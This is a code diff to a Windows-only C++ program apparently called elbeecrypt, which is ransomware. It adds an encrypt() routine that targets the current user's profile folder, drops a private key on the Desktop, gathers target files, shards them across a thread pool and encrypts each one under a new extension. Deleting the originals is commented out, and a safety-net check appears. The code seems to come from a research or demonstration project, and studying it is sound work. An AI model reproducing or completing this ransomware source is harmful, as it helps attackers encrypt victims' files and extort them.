@@ -1,15 +1,25 @@
+//C++ std dependencies
 #include <filesystem>
 #include <fstream>
 #include <iostream>
+#include <map>
 #include <string>
 #include <vector>
-#include "elbeecrypt/cryptor/hunter-encryptor.hpp"
-#include "elbeecrypt/cryptor/main.hpp"
 
+//3rd-party dependencies
+#include <fmt/core.h>
+#include "thread-pool/BS_thread_pool.hpp"
+
+//Common dependencies
 #include "elbeecrypt/common/settings.hpp"
-#include "elbeecrypt/common/targets/extensions.hpp"
+#include "elbeecrypt/common/io/cryptor-engine.hpp"
 #include "elbeecrypt/common/utils/fs.hpp"
 #include "elbeecrypt/common/utils/string.hpp"
+#include "elbeecrypt/common/utils/threadsafe_cout.hpp"
+
+//Cryptor dependencies
+#include "elbeecrypt/cryptor/hunter-encryptor.hpp"
+#include "elbeecrypt/cryptor/main.hpp"
 
 
 //Platform-specific includes
@@ -22,9 +32,9 @@
 	#error "This code is only meant to be compiled for Windows targets. Either cross-compile or build natively on Win-32."
 #endif
 
+//Namespace definitions
 namespace fs = std::filesystem;
 using namespace elbeecrypt;
-using namespace std;
 
 void writeTo(fs::path path, std::string content){
 	std::ofstream file;
@@ -46,24 +56,13 @@ int main(int argc, char **argv){
 		if(!cryptor::Main::safetyNet()) exit(-1);
 	}
 
-	cout << "Encryption routines started!" << endl;
+	//Encrypt files
+	std::cout << "Encryption routines started!" << std::endl;
+	cryptor::Main::encrypt();
 
 
 	//Set the base path
-	const fs::path basePath("C:\\Users\\" + std::string(getenv("username")));
-	std::cout << "Path: " << basePath << std::endl;
-
-
-
-	cryptor::HunterEncryptor h = cryptor::HunterEncryptor({basePath});
-	//elbeecrypt::common::io::Hunter h({basePath});
-
-	std::cout << h.toString() << std::endl;
-
-	std::cout << "Targets:" << std::endl;
-	for(fs::path item : h.getTargets()){
-		std::cout << "\t" << item.string() << std::endl;
-	}
+	
 
 
 
@@ -105,4 +104,66 @@ bool cryptor::Main::safetyNet(){
 
 	//No cancellations, so return true be default
 	return true;
+}
+
+/** Impl of encrypt(). */
+void cryptor::Main::encrypt(){
+	//Set the root directories
+	const fs::path basePath("C:\\Users\\" + std::string(getenv("username")));
+	std::cout << "Path: " << basePath << std::endl;
+
+	//Initialize the encryption engine
+	common::io::CryptorEngine cryptorEngine(common::Settings::CRYPTO_CHUNK_SIZE);
+
+	//Drop the encryption key to the desktop
+	std::string keyName = fmt::format(common::Settings::ENCRYPTION_KEY_NAME, fmt::arg("pubkeyFingerprint", cryptorEngine.pubkeyFingerprint()));
+	fs::path encryptionKeyPath = basePath / "Desktop" / keyName;
+	cryptorEngine.exportPrivkey(encryptionKeyPath);
+
+	//Get the list of targets to encrypt
+	cryptor::HunterEncryptor hunter({basePath});
+
+	//Shard the targets vector x ways
+	std::map<uint32_t, std::vector<fs::path>> shards = common::utils::Container::shardVector(hunter.getTargets(), common::Settings::ENCRYPTION_THREADS);
+
+	//Create vectors to store the lists of  and unsuccessfully encrypted files
+	std::vector<fs::path> successfullyEncrypted = {};
+	std::vector<fs::path> failedEncrypted = {};
+
+	//Create a thread pool for file encryption
+	BS::thread_pool pool(common::Settings::ENCRYPTION_THREADS);
+
+	//Create the encryptor lambda
+	auto encryptor = [&cryptorEngine, &successfullyEncrypted, &failedEncrypted](const std::vector<fs::path>& targets){
+		//Loop over the targets
+		for(fs::path target : targets){
+			//Create the path in which the target encrypted file will be dropped
+			fs::path encryptedOut = common::utils::FS::appendExt(target, common::Settings::ENCRYPTED_EXTENSION);
+
+			//Encrypt the file with the cryptor engine
+			common::io::CryptorEngine::Status encryptionResult = cryptorEngine.encryptFile(target, encryptedOut);
+
+			//Delete the file at the given path
+			//fs::remove(target);
+
+			//Add the path to the appropriate vector depending on the result
+			encryptionResult == common::io::CryptorEngine::Status::OK ? 
+				successfullyEncrypted.push_back(target) :
+				failedEncrypted.push_back(target);
+		}
+	};
+
+	//std::cout << shards.at(0).at(0) << std::endl;
+
+	//Create x threads to encrypt the files
+	for(size_t i = 0; i < shards.size(); i++){
+		//Spawn a thread to encrypt the current shard of file paths
+		pool.push_task(encryptor, shards.at(i));
+		common::utils::Cout{} << "Pushed shard #" << (i + 1) << " for processing. Shard contains " << shards.at(i).size() << " items..." << std::endl;
+	}
+
+	//Wait on the treads to complete before going on
+	pool.wait_for_tasks();
+	common::utils::Cout{} << "Encrypted " << successfullyEncrypted.size() << " files" << std::endl;
+	common::utils::Cout{} << "Failed to encrypt " << failedEncrypted.size() << " files" << std::endl;
 }
